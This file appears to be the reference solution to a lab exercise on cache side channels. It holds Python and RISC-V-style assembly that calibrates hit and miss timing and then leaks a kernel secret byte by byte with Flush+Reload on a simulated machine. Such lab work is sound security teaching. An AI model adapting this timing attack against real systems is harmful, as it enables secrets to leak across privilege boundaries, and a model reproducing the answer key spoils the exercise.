"""Part 1 -- Flush+Reload through the syscall interface (REFERENCE SOLUTION: spoilers!).

The kernel's SYS_FR(i) architecturally touches PROBE[secret1[i] * 4096].  We
flush all 256 probe slots, make the system call, and time a reload of every
slot: the one that comes back fast is the secret byte.
"""

# ---------------------------------------------------------------------------
# Exercise 1-1: measure hit and miss latencies and choose a threshold
# ---------------------------------------------------------------------------
NSAMPLES = 64

CALIBRATE_SRC = f"""
.data
.align 64
target:  .zero 64                  # the line we time
samples: .zero {8 * 2 * NSAMPLES}  # samples[2k] = hit time, samples[2k+1] = miss time
.text
_start:
    la      s0, target
    la      s1, samples
    li      s2, {NSAMPLES}
loop:
    lb      t0, 0(s0)               # make sure the line is cached
    rdcycle t1
    lb      t0, 0(s0)               # timed hit
    rdcycle t2
    sub     t2, t2, t1
    sd      t2, 0(s1)
    clflush 0(s0)                   # evict it from every level
    rdcycle t1
    lb      t0, 0(s0)               # timed miss
    rdcycle t2
    sub     t2, t2, t1
    sd      t2, 8(s1)
    addi    s1, s1, 16
    addi    s2, s2, -1
    bnez    s2, loop
    halt
"""


def calibrate(m):
    prog = m.load(CALIBRATE_SRC)
    m.run(prog)
    samples = m.read_u64s(prog["samples"], 2 * NSAMPLES)
    hits, misses = sorted(samples[0::2]), sorted(samples[1::2])
    # Use robust quantiles: rare interrupt spikes make a few hits look slow.
    hit_hi = hits[int(0.9 * len(hits))]
    miss_lo = misses[len(misses) // 10]
    return (hit_hi + miss_lo) // 2


# ---------------------------------------------------------------------------
# Exercise 1-2: leak secret1[i]
# ---------------------------------------------------------------------------
LEAK_SRC = """
.data
.align 64
times:  .zero 2048                  # times[b] = reload latency of PROBE[b * 4096]
.text
_start:                             # a0 = index of the secret byte
    mv      s5, a0
    # 1. flush every probe slot
    li      s0, PROBE_BASE
    li      s1, PROBE_ENTRIES
flush:
    clflush 0(s0)
    addi    s0, s0, PROBE_STRIDE
    addi    s1, s1, -1
    bnez    s1, flush
    # 2. let the kernel touch PROBE[secret1[i] * 4096]
    mv      a0, s5
    li      a7, SYS_FR
    syscall
    # 3. reload and time every slot
    li      s0, PROBE_BASE
    la      s2, times
    li      s1, PROBE_ENTRIES
reload:
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     t2, t2, t1
    sd      t2, 0(s2)
    addi    s0, s0, PROBE_STRIDE
    addi    s2, s2, 8
    addi    s1, s1, -1
    bnez    s1, reload
    halt
"""


def leak_byte(m, i):
    """Return secret1[i] (an int 0..255)."""
    thr = m.user.get("threshold")
    if thr is None:
        thr = m.user["threshold"] = calibrate(m)
    prog = m.load(LEAK_SRC)
    times = None
    for _attempt in range(10):
        m.run(prog, a0=i)
        times = m.read_u64s(prog["times"], 256)
        hits = [b for b in range(256) if times[b] < thr]
        if len(hits) == 1:          # unambiguous: exactly one cached slot
            return hits[0]
        # zero hits: an interrupt spike hid the hit -> try again
    return min(range(256), key=times.__getitem__)
